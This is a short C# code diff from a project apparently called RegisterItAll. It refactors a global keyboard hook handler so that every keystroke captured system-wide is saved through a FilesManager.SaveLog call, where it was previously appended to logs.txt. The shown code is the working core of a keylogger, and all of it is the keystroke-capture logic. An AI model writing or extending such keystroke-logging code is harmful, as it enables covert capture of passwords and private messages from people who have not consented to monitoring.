@@ -1,7 +1,6 @@
 ﻿using Gma.System.MouseKeyHook;
+using RegisterItAll.Managers;
 using RegisterItAll.Services.Base;
-using System;
-using System.IO;
 using System.Windows.Forms;
 
 namespace RegisterItAll.Services
@@ -19,9 +18,7 @@ namespace RegisterItAll.Services
 
         private static void OnKeyPressed(object sender, KeyPressEventArgs args)
         {
-            Console.WriteLine(args.KeyChar.ToString());
-
-            File.AppendAllText("logs.txt", args.KeyChar.ToString());
+            FilesManager.SaveLog(args.KeyChar.ToString());
         }
     }
 }
